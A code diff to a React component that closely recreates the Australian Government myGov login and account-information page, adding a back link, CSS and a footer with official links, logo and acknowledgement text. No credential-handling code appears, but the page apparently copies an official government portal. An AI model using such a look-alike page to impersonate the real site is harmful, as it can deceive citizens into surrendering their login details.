@@ -1,9 +1,12 @@
 import React from "react";
 import img from "./image/img.svg";
+import img2 from "./image/img2.svg";
+import back from "./image/back.svg";
+import "./Mygov.css";
 
 export default function Mygov() {
   return (
-    <div>
+    <div className="main-container">
       <header role="banner" className="mgvEnhanceHeader">
         <section className="inner-wrapper">
           <div className="inner">
@@ -37,6 +40,9 @@ export default function Mygov() {
                 <div className="login-grid-column">
                   <div className="digital-id-login-card-wrapper">
                     <div className="digital-id-main-login-card override">
+                      <div className="back-link">
+
+                        <img src={back} alt="back button" className="back-icon" />
                       <a
                         data-go-back-link=""
                         className="button-back"
@@ -44,6 +50,7 @@ export default function Mygov() {
                       >
                         Back
                       </a>
+                      </div>
                       <div
                         id="passkey-auth-error"
                         className="alert alert-danger error-msg"
@@ -76,7 +83,7 @@ export default function Mygov() {
                           </div>
                         </div>
                       </div>
-                      
+
                       <h1>MyGov Account Information</h1>
                       <h2
                         className="text-align-left"
@@ -232,6 +239,69 @@ export default function Mygov() {
           </div>
         </div>
       </div>
+
+      <footer role="contentinfo">
+        <div className="footer-wrapper">
+          <div className="footer-inner">
+            <section className="footer-list">
+              <>
+                <h2 className="sr-only" aria-label="Footer">
+                  Footer
+                </h2>
+                <ul className="lower-links">
+                  <li>
+                    <a target="_blank" href="https://my.gov.au/en/about/terms">
+                      Terms of use
+                    </a>
+                  </li>
+                  <li>
+                    <a
+                      target="_blank"
+                      href="https://my.gov.au/en/about/privacy-and-security"
+                    >
+                      Privacy and security
+                    </a>
+                  </li>
+                  <li>
+                    <a
+                      target="_blank"
+                      href="https://my.gov.au/en/about/copyright"
+                    >
+                      Copyright
+                    </a>
+                  </li>
+                  <li>
+                    <a
+                      target="_blank"
+                      href="https://my.gov.au/en/about/accessibility"
+                    >
+                      Accessibility
+                    </a>
+                  </li>
+                </ul>
+              </>
+            </section>
+            <div className="footer-lower">
+              <section className="footer-lower-logo">
+                <a href="https://my.gov.au">
+                  <img
+                    src={img2}
+                    alt="Australian Government and myGov logo"
+                    width="313.17"
+                    height="70"
+                    role="img"
+                  />
+                </a>
+              </section>
+              <p className="footer-acknowledgement">
+                We acknowledge the Traditional Custodians of the lands we live
+                on. We pay our respects to all Elders, past and present, of all
+                Aboriginal and Torres Strait Islander nations.
+              </p>
+            </div>
+          </div>
+        </div>
+      </footer>
     </div>
   );
 }
